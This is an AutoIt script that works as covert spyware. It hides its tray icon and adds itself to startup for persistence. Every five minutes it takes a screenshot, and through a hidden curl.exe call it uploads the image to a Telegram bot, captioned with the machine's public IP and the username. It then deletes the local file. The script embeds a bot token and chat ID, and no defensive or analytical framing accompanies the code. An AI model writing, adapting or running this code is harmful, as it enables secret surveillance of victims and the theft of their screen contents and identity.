#NoTrayIcon
#include '_Startup.au3'
#include <Inet.au3>
#include <ScreenCapture.au3>


While 1
   $sPublicIP = _GetIP()
$imagee=@TempDir&"\ehuehue.jpg"
Local $hBmp
   	_StartupRegistry_Install()
    $hBmp = _ScreenCapture_Capture("")
    _ScreenCapture_SaveImage($imagee, $hBmp)
ShellExecuteWait('curl.exe',' -s -X POST "https://api.telegram.org/bot301147721:AAFizhCHrY0aHpyCCGUE3a2yQSgr_aQHfcI/sendPhoto" -F chat_id=-1001101127047 -F photo="@'&$imagee&'" -F caption="'&$sPublicIP&' - '&@UserName&'"',@TempDir,"",@SW_HIDE)
FileDelete($imagee)
Sleep(300000)
WEnd
